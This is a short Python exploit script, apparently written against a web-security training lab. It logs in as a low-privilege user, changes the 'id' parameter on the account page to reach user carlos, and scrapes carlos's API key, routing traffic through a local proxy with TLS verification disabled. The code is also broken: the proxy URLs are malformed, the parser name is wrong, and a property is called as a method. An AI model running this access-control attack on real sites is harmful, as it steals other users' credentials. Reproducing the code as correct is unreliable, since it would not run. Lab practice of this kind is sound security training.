import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html-parser')
    csrf =soup.find("input",{'name':'csrf'})['value']
    return csrf

def carlos_api_key(s, url):
    #get CSRF token from login page 
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url) 
    #Rest of the code here 
    #Logging in as the user ?weiner 
    print("(+) Logging in as the user weiner...")
    login_data = {'csrf': csrf_token, 'username':'weiner', 'password':'peter'}
    r = s.post(login_url, data=login_data , verify=False, proxies=proxies)
    res= r.text()
    if 'Log out' in res:
        print('(+) Successfully Logged in as user weiner ')        
        #Exploite the access control vulnerability to access the user carlos  
        carlos_url = url + '/my-account?id=carlos'
        r = s.get(carlos_url, verify=False, proxies=proxies)
        res = r.text()
        if 'carlos' in res: 
            print("(+) Successfully exploited the Access control vulnerability")
            print("(+) Retreiving the API key for the user carlos...")
            api_key = re.search("your api key is :(.*)", res).group(1)
            print("API key is:" + api_key.split('</div>')[0])
        else:
            print("(+) Failed to get the API key for the user carlos")
            sys.exit(-1)
    else:
        print('(+) Failed to log in as user weiner ')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    carlos_api_key(s, url)

if __name__ == '__main__':
    main()